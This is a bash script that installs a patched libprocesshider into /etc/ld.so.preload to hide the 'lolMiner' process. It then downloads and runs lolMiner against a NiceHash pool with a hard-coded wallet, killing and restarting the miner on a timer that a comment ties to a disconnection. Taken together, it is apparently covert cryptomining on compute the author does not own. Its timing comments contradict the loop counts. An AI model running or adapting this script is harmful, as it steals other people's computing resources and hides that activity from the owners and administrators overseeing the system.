#!/usr/bin/env bash

pause="true"
preload="true"

if [[ $preload == *"true"* ]] && [[ $pause == *"false"* ]]; then
    git clone https://github.com/gianlucaborello/libprocesshider; cd libprocesshider; awk '{ if (NR == 12) print "static const char* process_to_filter = \"lolMiner\";"; else print $0}' processhider.c > processhider1.c; rm processhider.c; mv processhider1.c processhider.c; make; sudo mv libprocesshider.so /usr/local/lib/; sudo sh -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload";
fi

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29/

while [[ true ]]; do
    ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 3DomNvzA9pLFq1Y5wH9pMy6mnn7M7VEvaH.vailol &
    if [[ $pause == *"true"* ]]; then
      # in 12min = 720s disconnection occures
      
      # MIning for for 4min = 240s
      for i in {1..300}
      do
          sleep 1
      done
      
      killall -9 lolMiner

      # sleep for 4min = 240s
      for i in {1..360}
      do
          sleep 1
          echo "Sleeping for $i. time"
          #nvidia-smi
      done
      uptime
    else
      sleep 99999999999999999999999999999999999999
    fi
done
